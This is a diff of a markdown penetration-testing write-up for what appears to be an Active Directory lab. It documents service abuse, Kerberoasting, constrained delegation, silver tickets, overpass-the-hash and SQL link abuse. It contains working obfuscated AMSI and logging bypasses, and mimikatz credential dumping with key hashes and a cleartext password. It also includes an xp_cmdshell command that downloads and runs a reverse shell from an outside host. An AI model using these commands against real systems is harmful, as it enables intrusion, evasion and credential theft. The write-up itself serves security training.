@@ -1028,11 +1028,9 @@ LocalAdmin      :
 
 ---
 
-### Local Privilege Escalation
+### Local Privilege Escalation | Feature Abuse (with PowerUp)
 
-#### Local Privilege Escalation | Feature Abuse (with PowerUp)
-
-2) **Abusing Modifiable Services for Privilege Escalation** (successful ✅)
+2) **Service Abuse for Local Privilege Escalation** (successful ✅)
 
 Description: Identified and exploited a misconfigured Windows service (`vds`) to escalate privileges by modifying its binary path and adding the current user to the Administrators group.
 
@@ -1107,11 +1105,9 @@ BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Manda
 
 ---
 
-### Domain Privilege Escalation
+### Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
 
-#### Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)
-
-3) **Kerberoasting Attack Attempt** (unsuccessful ❌)
+3) **Kerberoasting Attack for Domain Privilege Escalation** (unsuccessful ❌)
 
 Description: Enumerated service accounts with Service Principal Names (SPNs) and performed a Kerberoasting attack on `sqlserversync`. Successfully extracted a Kerberos TGS ticket but failed to crack the password using multiple wordlists, indicating a strong password policy.
 
@@ -1221,11 +1217,11 @@ Session completed.
 
 ---
 
-#### Domain Privilege Escalation | Constrained Delegation + DCSync (with PowerView, Rubeus, SafetyKatz)
+### Domain Privilege Escalation | Constrained Delegation (with PowerView, Rubeus, SafetyKatz)
 
-4) **Exploiting Constrained Delegation to Gain Administrator Access and Remote Control of `mgmtsrv.tech.finance.corp`** (successful ✅)
+4) **Constrained Delegation Abuse for Domain Privilege Escalation** (successful ✅)
 
-Description: Performed Active Directory enumeration to identify users or machines with **Constrained Delegation** enabled. The attempt to find a user account with delegation rights was unsuccessful. However, enumeration of **computer accounts** revealed that `studvm` has Constrained Delegation enabled and is allowed to delegate authentication to the **CIFS service on `mgmtsrv`**. This finding is leveraged to impersonate a privileged user and escalate privileges. 
+Description: Performed Active Directory enumeration to identify users or machines with **Constrained Delegation** enabled. The attempt to find a user account with delegation rights was unsuccessful. However, enumeration of **computer accounts** revealed that `STUDVM$` has Constrained Delegation enabled and is allowed to delegate authentication to the **CIFS service on `mgmtsrv.tech.finance.corp`**. This finding is leveraged to impersonate a privileged user and escalate privileges.
 
 - **Find a Delegator User where Constrained Delegation is Enabled**
 
@@ -1301,7 +1297,7 @@ dnshostname                   : studvm.tech.finance.corp
 
 ![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
-`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
+`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
 [SNIP]
 
@@ -1386,7 +1382,7 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-- **Leverage the Obtained Ticket to Gain an Interactive Administrator Session on the Delegatee Server**
+- **Leverage the Obtained Ticket to Gain Administrator Access and Remote Control on the Delegatee Server**
 
 `winrs -r:mgmtsrv.tech.finance.corp cmd`:
 ```
@@ -1412,11 +1408,15 @@ COMPUTERNAME=MGMTSRV🖥️
 
 ---
 
-[SCREENSHOT]
+### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
 
-### ???
+5) **Credential Extraction for Domain Lateral Movement** (successful ✅)
 
-![mgmtsrv | administrator](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator-64b5f6?logo=windows11&logoColor=white)
+Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **cleartext credentials** and **Kerberos keys** of `techservice` and `MGMTSRV$` from **LSASS memory** on `mgmtsrv.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.
+
+![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+
+- **Bypassing PowerShell Logging and AMSI for Evasion**
 
 `powershell`
 
@@ -1433,23 +1433,35 @@ FullLanguage
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
-``:
-```
+- **Extract Credentials of `techservice` and `MGMTSRV$` from Memory on `mgmtsrv.tech.finance.corp`**
 
-```
+![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
 
-- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
-???
-
-![HFS - Loader.exe](learning_objective_07_hfs_loader.png)
+![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
-![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"`:
+```
+[SNIP]
 
-`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe sekurlsa::evasive-keys exit`:
+mimikatz(commandline) # token::elevate📌
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+588     {0;000003e7} 1 D 18373          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !📌
+ * Process Token : {0;0028e875} 0 D 2685490     TECH\Administrator      S-1-5-21-1325336202-3661212667-302732393-500            (12g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2701727     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # vault::cred /patch
+```
+❌
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
 [SNIP]
 
@@ -1502,29 +1514,15 @@ SID               : S-1-5-18
 ```
 🚩
 
-[SCREENSHOT]
+---
 
-`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe token::elevate`:
-```
-[SNIP]
+### Domain Persistence | Silver Ticket (with Rubeus)
 
-mimikatz(commandline) # token::elevate📌
-Token Id  : 0
-User name :
-SID name  : NT AUTHORITY\SYSTEM
+6) **Silver Ticket Attack for Domain Persistence** (successful ✅)
 
-588     {0;000003e7} 1 D 18373          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
- -> Impersonated !📌
- * Process Token : {0;0028e875} 0 D 2685490     TECH\Administrator      S-1-5-21-1325336202-3661212667-302732393-500            (12g,24p)       Primary
- * Thread Token  : {0;000003e7} 1 D 2701727     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+Description: Leveraged the **RC4 Kerberos key** extracted from `mgmtsrv` to forge a **Silver Ticket** for the `http/mgmtsrv.tech.finance.corp` service. The ticket was generated using `Rubeus` and injected into the current session, granting **administrator-level access** to `mgmtsrv` **without requiring authentication from the Domain Controller**. This technique enables **persistence and stealthy access** to the target machine, bypassing standard Kerberos authentication mechanisms.
 
-mimikatz # vault::cred /patch
-```
-❌
-
-#### Domain Persistence | Silver Ticket
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/mgmtsrv.tech.finance.corp /rc4:207218a0920d00bbbd4daa22f6e767d3 /sid:S-1-5-21-1325336202-3661212667-302732393 /ldap /user:administrator /domain:tech.finance.corp /ptt`:
 ```
@@ -1591,20 +1589,28 @@ C:\Users\Administrator.TECH>
 ```
 🚀
 
-[SCREENSHOT]
+![mgmtsrv | administrator #>](https://custom-icon-badges.demolab.com/badge/mgmtsrv-administrator%20[%23>]-64b5f6?logo=windows11&logoColor=white)
+
+`set username`:
+```
+USERNAME=Administrator👤
+```
+
+`set computername`:
+```
+COMPUTERNAME=MGMTSRV🖥️
+```
+🚩
 
 ---
 
-## Domain Lateral Movement
+### Domain Lateral Movement | OverPass-The-Hash (with Rubeus)
 
-### Domain Lateral Movement 1 | Credential Extraction (with ...)
+7) **OverPass-The-Hash for Domain Lateral Movement** (successful ✅)
 
-- **Gain Access to the DC with DA Privileges using an OverPass-The-Hash Attack (for Lateral Movement)**
-???
+Description: Used the **AES-256 Kerberos Key** of `techservice`, extracted in a previous step, to request a **TGT (Ticket Granting Ticket)** without needing the user's password. This was achieved using `Rubeus` to perform an **OverPass-The-Hash attack**. The obtained ticket was injected into a **new logon session**, allowing authenticated access as `techservice` and enabling lateral movement to `techsrv30.tech.finance.corp`.
 
-![Run as administrator](learning_objectives_run_as_administrator.png)
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:techservice /aes256:7f6825f607e9474bcd6b9c684dc70f7c1ca977ade7bfd2ad152fd54968349deb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`:
 ```
@@ -1669,13 +1675,6 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-`winrs -r:techsrv30.tech.finance.corp cmd /c "set computername && set username"`:
-```
-COMPUTERNAME=TECHSRV30🖥️
-USERNAME=techservice👤
-```
-🚩
-
 `winrs -r:techsrv30.tech.finance.corp cmd`:
 ```
 Microsoft Windows [Version 10.0.17763.2452]
@@ -1685,56 +1684,30 @@ C:\Users\techservice>
 ```
 🚀
 
-![techsrv30 | techservice](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice-64b5f6?logo=windows11&logoColor=white)
+![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
-`whoami /priv`:
+`set username`:
 ```
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                            Description                                                        State
-========================================= ================================================================== =======
-SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
-SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
-SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
-SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
-SeSystemProfilePrivilege                  Profile system performance                                         Enabled
-SeSystemtimePrivilege                     Change the system time                                             Enabled
-SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
-SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
-SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
-SeBackupPrivilege                         Back up files and directories                                      Enabled
-SeRestorePrivilege                        Restore files and directories                                      Enabled
-SeShutdownPrivilege                       Shut down the system                                               Enabled
-SeDebugPrivilege                          Debug programs                                                     Enabled
-SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
-SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
-SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
-SeUndockPrivilege                         Remove computer from docking station                               Enabled
-SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
-SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
-SeCreateGlobalPrivilege                   Create global objects                                              Enabled
-SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
-SeTimeZonePrivilege                       Change the time zone                                               Enabled
-SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
-SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+USERNAME=techservice👤
 ```
 
-`whoami /groups`:
+`set computername`:
 ```
-GROUP INFORMATION
------------------
+COMPUTERNAME=TECHSRV30🖥️
+```
+🚩
 
-Group Name                                 Type             SID          Attributes
-========================================== ================ ============ ===============================================================
-Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
-BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
-```
+---
+
+### Domain Lateral Movement | Credential Extraction (with SafetyKatz)
+
+8) **Credential Extraction for Domain Lateral Movement** (successful ✅)
+
+Description: Executed **PowerShell logging and AMSI bypass techniques** to evade detection while performing credential extraction. Extracted **cleartext credentials** of `databaseagent` from the Windows Credential Vault and **Kerberos keys** of `TECHSRV30$` from **LSASS memory** on `techsrv30.tech.finance.corp`. These credentials will be leveraged for **lateral movement** and further privilege escalation within the domain.
+
+- **Bypassing PowerShell Logging and AMSI for Evasion**
+
+![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `powershell`
 
@@ -1743,18 +1716,54 @@ Authentication authority asserted identity Well-known group S-1-18-1     Mandato
 FullLanguage
 ```
 
-- **Extract the Encryption Key Hash (from the Target Machine 1 `dcorp-mgmt`) of the Target Domain Administrator**
-???
+```powershell
+[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
+```
 
-![HFS - Loader.exe](learning_objective_07_hfs_loader.png)
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+- **Extract Credentials of `databaseagent` and `TECHSRV30$` from Memory on `techsrv30.tech.finance.corp`**
+
+![HFS - Loader.exe, SafetyKatz.exe](learning_objective_07_hfs_loader_safetykatz.png)
+
+![techsrv30 | techservice #>](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe`
 
 `netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1`
 
-![HFS -SafetyKatz.exe](learning_objective_07_hfs_safetykatz.png)
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"`:
+```
+[SNIP]
 
-`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe sekurlsa::evasive-keys exit`:
+mimikatz(commandline) # token::elevate📌
+
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+596     {0;000003e7} 1 D 18459          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !📌
+ * Process Token : {0;0028c0cb} 0 D 2727993     TECH\techservice        S-1-5-21-1325336202-3661212667-302732393-1109   (09g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2744954     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # vault::cred /patch📌
+
+TargetName : Domain:batch=TaskScheduler:Task:{877E4326-BAD4-4516-A4B1-60C73F0EFDDA} / <NULL>
+UserName   : TECH\databaseagent👤
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : CheckforSQLServer31-Availability🔑
+Attributes : 0
+
+[SNIP]
+```
+
+`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
 ```
 [SNIP]
 
@@ -1783,39 +1792,15 @@ SID               : S-1-5-18
 ```
 🚩
 
-`C:\Users\Public\Loader.exe -path http://127.0.0.1:1234/SafetyKatz.exe token::elevate`:
-```
-[SNIP]
+---
 
-mimikatz(commandline) # token::elevate📌
+### Domain Lateral Movement | OverPass-The-Hash (with RunAs)
 
-Token Id  : 0
-User name :
-SID name  : NT AUTHORITY\SYSTEM
+9) **OverPass-The-Hash for Domain Lateral Movement** (successful ✅)
 
-596     {0;000003e7} 1 D 18459          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
- -> Impersonated !📌
- * Process Token : {0;0028c0cb} 0 D 2727993     TECH\techservice        S-1-5-21-1325336202-3661212667-302732393-1109   (09g,24p)       Primary
- * Thread Token  : {0;000003e7} 1 D 2744954     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+Description: Used the **cleartext credentials** of `databaseagent`, extracted in a previous step, to initiate a **net-only authentication session** with `runas`. This allowed running commands as `databaseagent` while maintaining the original user's context in the local environment. Privilege enumeration revealed that **SeDebugPrivilege** and **SeImpersonatePrivilege** were enabled, which could be leveraged for **potential privilege escalation** and further lateral movement within the domain.
 
-mimikatz(commandline) # vault::cred /patch📌
-
-TargetName : Domain:batch=TaskScheduler:Task:{877E4326-BAD4-4516-A4B1-60C73F0EFDDA} / <NULL>
-UserName   : TECH\databaseagent👤
-Comment    : <NULL>
-Type       : 2 - domain_password
-Persist    : 2 - local_machine
-Flags      : 00004004
-Credential : CheckforSQLServer31-Availability🔑
-Attributes : 0
-
-[SNIP]
-```
-🚩
-
-![Run as administrator](learning_objectives_run_as_administrator.png)
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser #>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%23>]-64b5f6?logo=windows11&logoColor=white)
 
 `runas /user:tech\databaseagent /netonly "powershell -Command \"Start-Process cmd -Verb RunAs\""`:
 ```
@@ -1825,7 +1810,7 @@ Attempting to start powershell -Command "Start-Process cmd -Verb RunAs" as user 
 
 ![New spawned terminal process 2](./assets/screenshots/learning_objective_07_new_spawned_terminal_process_2.png)
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -1850,174 +1835,32 @@ PRIVILEGES INFORMATION
 
 Privilege Name                            Description                                                        State
 ========================================= ================================================================== ========
-SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
-SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
-SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
-SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
-SeSystemProfilePrivilege                  Profile system performance                                         Disabled
-SeSystemtimePrivilege                     Change the system time                                             Disabled
-SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
-SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
-SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
-SeBackupPrivilege                         Back up files and directories                                      Disabled
-SeRestorePrivilege                        Restore files and directories                                      Disabled
-SeShutdownPrivilege                       Shut down the system                                               Disabled
-SeDebugPrivilege                          Debug programs                                                     Enabled
+
+[SNIP]
+
+SeDebugPrivilege📑                        Debug programs                                                     Enabled✅
 SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
 SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
 SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
 SeUndockPrivilege                         Remove computer from docking station                               Disabled
 SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
-SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeImpersonatePrivilege📑                  Impersonate a client after authentication            Enabled✅
 SeCreateGlobalPrivilege                   Create global objects                                              Enabled
-SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
-SeTimeZonePrivilege                       Change the time zone                                               Disabled
-SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
-SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
-```
 
-???
-
-`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
-```
 [SNIP]
-```
-
-`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
-
-`Find-PSRemotingLocalAdminAccess -Domain tech.finance.corp -Verbose`:
-```
-VERBOSE: Trying to run a command parallely on the provided computers list using PSRemoting.
-```
-❌
-
-`winrs -r:dbserver31.tech.finance.corp cmd`:
-```
-Winrs error:Access is denied.
-```
-❌
-
-???
-
-- **Firewall???**
-
-![techsrv30 | techservice](https://custom-icon-badges.demolab.com/badge/techsrv30-techservice-64b5f6?logo=windows11&logoColor=white)
-
-`Get-Service -Name MpsSvc`:
-```
-Status   Name               DisplayName
-------   ----               -----------
-Running  MpsSvc             Windows Defender Firewall
-```
-
-`Get-NetFirewallProfile | Select Name, Enabled`:
-```
-Name    Enabled
-----    -------
-Domain    False
-Private   False
-Public    False
-```
-
-`Test-NetConnection -ComputerName localhost -Port 8080`:
-```
-WARNING: TCP connect to (::1 : 8080) failed
-WARNING: TCP connect to (127.0.0.1 : 8080) failed
-
-
-ComputerName           : localhost
-RemoteAddress          : ::1
-RemotePort             : 8080
-InterfaceAlias         : Loopback Pseudo-Interface 1
-SourceAddress          : ::1
-PingSucceeded          : True
-PingReplyDetails (RTT) : 0 ms
-TcpTestSucceeded       : False📌
 ```
 
 ---
 
-#### Domain Privilege Escalation | Resource-based Constrained Delegation (with PowerView, Rubeus, SafetyKatz)
+### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
 
-- **Find a Target Server where we have Write Permissions and Access to it**
+10) **SQL Server Links Abuse for Domain Lateral Movement** (successful ✅)
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+Description: Abused **SQL Server Linked Server functionality** to perform **lateral movement** within the domain. First, identified a target SQL Server (`dbserver31.tech.finance.corp`) where the user `databaseagent` had **authentication rights** and was a **sysadmin**. Then, validated the ability to execute commands on a linked SQL Server using `xp_cmdshell`. Finally, a reverse shell was obtained by executing a **PowerShell script** on the target server, successfully establishing a foothold on `dbserver31.tech.finance.corp` as `sqlserversync`. This allows further **privilege escalation** and post-exploitation actions within the domain.
 
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
+- **Identify a Target SQL Server where we have Authentication Rights**
 
-`Import-Module C:\AD\Tools\PowerView.ps1`
-
-`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'techservice'}`
-
-`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'sqlserversync'}`:
-```
-ObjectDN                : DC=tech,DC=finance,DC=corp
-AceQualifier            : AccessAllowed
-ActiveDirectoryRights   : ExtendedRight
-ObjectAceType           : DS-Replication-Get-Changes-In-Filtered-Set📑
-AceFlags                : None
-AceType                 : AccessAllowedObject
-InheritanceFlags        : None
-SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
-IdentityReferenceName   : sqlserversync👤
-IdentityReferenceDomain : tech.finance.corp
-IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
-IdentityReferenceClass  : user
-
-ObjectDN                : DC=tech,DC=finance,DC=corp
-AceQualifier            : AccessAllowed
-ActiveDirectoryRights   : ExtendedRight
-ObjectAceType           : DS-Replication-Get-Changes📑
-AceFlags                : None
-AceType                 : AccessAllowedObject
-InheritanceFlags        : None
-SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
-IdentityReferenceName   : sqlserversync👤
-IdentityReferenceDomain : tech.finance.corp
-IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
-IdentityReferenceClass  : user
-
-ObjectDN                : DC=tech,DC=finance,DC=corp
-AceQualifier            : AccessAllowed
-ActiveDirectoryRights   : ExtendedRight
-ObjectAceType           : DS-Replication-Get-Changes-All📑
-AceFlags                : None
-AceType                 : AccessAllowedObject
-InheritanceFlags        : None
-SecurityIdentifier      : S-1-5-21-1325336202-3661212667-302732393-1111
-IdentityReferenceName   : sqlserversync👤
-IdentityReferenceDomain : tech.finance.corp
-IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
-IdentityReferenceClass  : user
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
-``:
-```
-
-```
-
----
-
-### Cross Trust Attacks
-
-#### Cross Trust Attacks | SQL Server Links Abuse (with PowerUpSQL, Invoke-PowerShellTcpEx)
-
-- **Find a Target SQL Server where we have Connection Privileges**
-
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
 ```
@@ -2079,6 +1922,8 @@ Cached Tickets: (2)
         Kdc Called: tech-dc.tech.finance.corp
 ```
 
+- **Enumerate Linked Servers on the Target SQL Server**
+
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Verbose`:
 ```
 VERBOSE: dbserver31.tech.finance.corp : Connection Success.
@@ -2102,6 +1947,8 @@ User        : TECH\databaseagent👤
 Links       :
 ```
 
+- **Validate Command Execution on a Linked SQL Server**
+
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query "exec master..xp_cmdshell 'set username'"`:
 ```
 Version     : SQL Server 2019
@@ -2113,7 +1960,9 @@ User        : TECH\databaseagent
 Links       :
 ```
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+- **Obtain a Reverse Shell Executing a PowerShell Script on the Target SQL Server**
+
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\nc64.exe -lvp 443`:
 ```
@@ -2126,7 +1975,7 @@ listening on [any] 443 ...
 
 `Get-SQLServerLinkCrawl -Instance 'dbserver31.tech.finance.corp' -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget 'dbserver31'`
 
-![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)
+![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 ```
 [...]
